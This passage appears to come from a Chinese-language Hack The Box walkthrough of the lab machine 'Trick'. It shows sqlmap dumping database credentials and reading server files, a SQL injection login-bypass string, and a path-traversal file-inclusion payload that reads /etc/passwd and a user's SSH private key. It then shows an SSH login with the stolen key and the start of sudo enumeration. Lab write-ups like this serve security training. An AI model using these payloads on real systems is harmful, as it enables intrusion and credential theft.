<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap -r 1 --batch --current-user<br><br>current user: &#x27;remo<span class="hljs-meta">@localhost&#x27;</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap -r 1 --batch --threads 10 -D payroll_db --tables<br><br>Database: payroll_db<br>[11 tables]<br>+---------------------+<br>|<span class="hljs-string"> position            </span>|<br>|<span class="hljs-string"> allowances          </span>|<br>|<span class="hljs-string"> attendance          </span>|<br>|<span class="hljs-string"> deductions          </span>|<br>|<span class="hljs-string"> department          </span>|<br>|<span class="hljs-string"> employee            </span>|<br>|<span class="hljs-string"> employee_allowances </span>|<br>|<span class="hljs-string"> employee_deductions </span>|<br>|<span class="hljs-string"> payroll             </span>|<br>|<span class="hljs-string"> payroll_items       </span>|<br>|<span class="hljs-string"> users               </span>|<br>+---------------------+<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap -r 1 --batch --threads 10 -D payroll_db -T users --dump<br><br>Database: payroll_db<br>Table: users<br>[1 entry]<br>+----+-----------+---------------+--------+---------+---------+-----------------------+------------+<br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> doctor_id </span>|<span class="hljs-string"> name          </span>|<span class="hljs-string"> type   </span>|<span class="hljs-string"> address </span>|<span class="hljs-string"> contact </span>|<span class="hljs-string"> password              </span>|<span class="hljs-string"> username   </span>|<br>+----+-----------+---------------+--------+---------+---------+-----------------------+------------+<br>|<span class="hljs-string"> 1  </span>|<span class="hljs-string"> 0         </span>|<span class="hljs-string"> Administrator </span>|<span class="hljs-string"> 1      </span>|<span class="hljs-string"> &lt;blank&gt; </span>|<span class="hljs-string"> &lt;blank&gt; </span>|<span class="hljs-string"> SuperGucciRainbowCake </span>|<span class="hljs-string"> Enemigosss </span>|<br>+----+-----------+---------------+--------+---------+---------+-----------------------+------------+<br></code></pre></td></tr></table></figure>

<p>13、其实也能查配置文件的</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap -r <span class="hljs-number">1</span> --batch --threads <span class="hljs-number">10</span> --file-read=<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>default<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/.local/</span>share<span class="hljs-regexp">/sqlmap/</span>output<span class="hljs-regexp">/preprod-payroll.trick.htb/</span>files/_etc_nginx_sites-enabled_default<br>server &#123;<br>        listen <span class="hljs-number">80</span> default_server;<br>        listen [::]:<span class="hljs-number">80</span> default_server;<br>        server_name trick.htb;<br>        root <span class="hljs-regexp">/var/</span>www/html;<br><br>        index index.html index.htm index.nginx-debian.html;<br><br>        server_name _;<br><br>        location / &#123;<br>                try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>                include snippets/fastcgi-php.conf;<br>                fastcgi_pass unix:<span class="hljs-regexp">/run/</span>php/php7.<span class="hljs-number">3</span>-fpm.sock;<br>        &#125;<br>&#125;<br><br><br>server &#123;<br>        listen <span class="hljs-number">80</span>;<br>        listen [::]:<span class="hljs-number">80</span>;<br><br>        server_name preprod-marketing.trick.htb;<br><br>        root <span class="hljs-regexp">/var/</span>www/market;<br>        index index.php;<br><br>        location / &#123;<br>                try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>                include snippets/fastcgi-php.conf;<br>                fastcgi_pass unix:<span class="hljs-regexp">/run/</span>php/php7.<span class="hljs-number">3</span>-fpm-michael.sock;<br>        &#125;<br>&#125;<br><br>server &#123;<br>        listen <span class="hljs-number">80</span>;<br>        listen [::]:<span class="hljs-number">80</span>;<br><br>        server_name preprod-payroll.trick.htb;<br><br>        root <span class="hljs-regexp">/var/</span>www/payroll;<br>        index index.php;<br><br>        location / &#123;<br>                try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>                include snippets/fastcgi-php.conf;<br>                fastcgi_pass unix:<span class="hljs-regexp">/run/</span>php/php7.<span class="hljs-number">3</span>-fpm.sock;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>14、到这里，我们就获取到了管理员的账号密码， 同时，这个地址其实也存在万能密码登录的</p>
<p><code>admin&#39; or 1=1; -- -</code></p>
<p>15、我们先用管理员的账号先登录吧</p>
<p><code>http://preprod-payroll.trick.htb/index.php?page=home</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>16、这里发现后台里，密码是硬编码的，看来这里的预期应该是万能密码登录进入，然后发现硬编码的密码</p>
<p><code>http://preprod-payroll.trick.htb/index.php?page=users</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
<p>17、在后台，又新发现了一个子域名preprod-marketing.trick.htb，我们绑定绑定下吧</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.166 preprod-marketing.trick.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-string">[sudo]</span> kali 的密码：<br><span class="hljs-number">10.10.11.166</span> preprod-marketing.trick.htb<br></code></pre></td></tr></table></figure>

<p>18、查看下</p>
<p><code>http://preprod-marketing.trick.htb/</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<p><code>http://preprod-marketing.trick.htb/index.php?page=services.html</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
<p>19、在这里，我们发现了本地文件包含的漏洞，但是也是模糊出来的</p>
<p><code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//etc/passwd</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">tss:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span><span class="hljs-symbol">:TPM2</span> software stack,,,<span class="hljs-symbol">:/var/lib/tpm</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">usbmux:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">46</span><span class="hljs-symbol">:usbmux</span> daemon,,,<span class="hljs-symbol">:/var/lib/usbmux</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">rtkit:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">114</span><span class="hljs-symbol">:RealtimeKit</span>,,,<span class="hljs-symbol">:/proc</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">pulse:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span><span class="hljs-symbol">:PulseAudio</span> daemon,,,<span class="hljs-symbol">:/var/run/pulse</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>speech-<span class="hljs-symbol">dispatcher:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:Speech</span> <span class="hljs-title class_">Dispatcher</span>,,,<span class="hljs-symbol">:/var/run/speech-dispatcher</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">avahi:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">120</span><span class="hljs-symbol">:Avahi</span> mDNS daemon,,,<span class="hljs-symbol">:/var/run/avahi-daemon</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">saned:</span><span class="hljs-symbol">x:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-number">121</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/saned</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">colord:</span><span class="hljs-symbol">x:</span><span class="hljs-number">113</span><span class="hljs-symbol">:</span><span class="hljs-number">122</span><span class="hljs-symbol">:colord</span> colour management daemon,,,<span class="hljs-symbol">:/var/lib/colord</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">geoclue:</span><span class="hljs-symbol">x:</span><span class="hljs-number">114</span><span class="hljs-symbol">:</span><span class="hljs-number">123</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/geoclue</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">hplip:</span><span class="hljs-symbol">x:</span><span class="hljs-number">115</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:HPLIP</span> system user,,,<span class="hljs-symbol">:/var/run/hplip</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-title class_">Debian</span>-<span class="hljs-symbol">gdm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">116</span><span class="hljs-symbol">:</span><span class="hljs-number">124</span><span class="hljs-symbol">:Gnome</span> <span class="hljs-title class_">Display</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/lib/gdm3</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">coredump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Core</span> <span class="hljs-title class_">Dumper</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">117</span><span class="hljs-symbol">:</span><span class="hljs-number">125</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">118</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">119</span><span class="hljs-symbol">:</span><span class="hljs-number">126</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bind:</span><span class="hljs-symbol">x:</span><span class="hljs-number">120</span><span class="hljs-symbol">:</span><span class="hljs-number">128</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/bind</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">michael:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/michael</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure>

<p>20、这里我直接本地读取下用户目录的ssh的key</p>
<p><code>view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
<p>21、那就下载下来吧</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ wget http:<span class="hljs-comment">//preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa          </span><br>-<span class="hljs-number">-2024</span><span class="hljs-number">-09</span><span class="hljs-number">-25</span> <span class="hljs-number">14</span>:<span class="hljs-number">57</span>:<span class="hljs-number">54</span>--  http:<span class="hljs-comment">//preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa</span><br>正在解析主机 preprod-marketing.trick.htb (preprod-marketing.trick.htb)... <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span><br>正在连接 preprod-marketing.trick.htb (preprod-marketing.trick.htb)|<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span>|:<span class="hljs-number">80.</span>.. 已连接。<br>已发出 HTTP 请求，正在等待回应... <span class="hljs-number">200</span> OK<br>长度：未指定 [<span class="hljs-keyword">text</span>/html]<br>正在保存至: “index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa<span class="hljs-number">.1</span>”<br><br>index.php?page=....%2F%2F....%2F%2F...     [         &lt;=&gt;                                                                ]   <span class="hljs-number">1.78</span>K   <span class="hljs-number">670</span> B/s  用时 <span class="hljs-number">7.4</span>s    <br><br><span class="hljs-number">2024</span><span class="hljs-number">-09</span><span class="hljs-number">-25</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span>:<span class="hljs-number">04</span> (<span class="hljs-number">246</span> B/s) - “index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa<span class="hljs-number">.1</span>” 已保存 [<span class="hljs-number">1823</span>]<br></code></pre></td></tr></table></figure>

<p>22、这里重命下</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(kali㉿offsec)</span>-[~<span class="hljs-string">/Desktop</span>]<br>└─$ <span class="hljs-keyword">ls</span> -la id_rsa                  <br>-rw-r<span class="hljs-params">--r--</span> 1 kali kali 784  9月25日 14<span class="hljs-function">:54</span> id_rsa<br>                    <br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~<span class="hljs-string">/Desktop</span>]<br>└─$ chmod 600 id_rsa <br></code></pre></td></tr></table></figure>

<p>23、开始登录</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(kali㉿offsec)-[~/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-variable">$ </span>ssh michael<span class="hljs-variable">@10</span>.<span class="hljs-number">10.11</span>.<span class="hljs-number">166</span> -i id_rsa                                                                                           <br><span class="hljs-title class_">Linux</span> trick <span class="hljs-number">4.19</span>.<span class="hljs-number">0</span><span class="hljs-number">-20</span>-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span><br><br><span class="hljs-title class_">The</span> programs included <span class="hljs-keyword">with</span> the <span class="hljs-title class_">Debian</span> <span class="hljs-title class_">GNU</span>/<span class="hljs-title class_">Linux</span> system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br><span class="hljs-title class_">Debian</span> <span class="hljs-title class_">GNU</span>/<span class="hljs-title class_">Linux</span> comes <span class="hljs-keyword">with</span> <span class="hljs-title class_">ABSOLUTELY</span> <span class="hljs-title class_">NO</span> <span class="hljs-title class_">WARRANTY</span>, to the extent<br>permitted by applicable law.<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>id<br>uid=<span class="hljs-number">1001</span>(michael) gid=<span class="hljs-number">1001</span>(michael) groups=<span class="hljs-number">1001</span>(michael),<span class="hljs-number">1002</span>(security)<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>

<p>24、获取下第一个flag信息</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls<br><span class="hljs-title class_">Desktop</span>  <span class="hljs-title class_">Documents</span>  <span class="hljs-title class_">Downloads</span>  <span class="hljs-title class_">Music</span>  <span class="hljs-title class_">Pictures</span>  <span class="hljs-title class_">Public</span>  <span class="hljs-title class_">Templates</span>  user.txt  <span class="hljs-title class_">Videos</span><br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt <br><span class="hljs-number">05</span>c44d558a358cc1afec95ed242acf5a<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>25、通过枚举，这里发现了当前用户，拥有sudo的权限</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elixir">michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> michael on <span class="hljs-symbol">trick:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> michael may run the following commands on <span class="hljs-symbol">trick:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /etc/init.d/fail2ban restart<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls -la 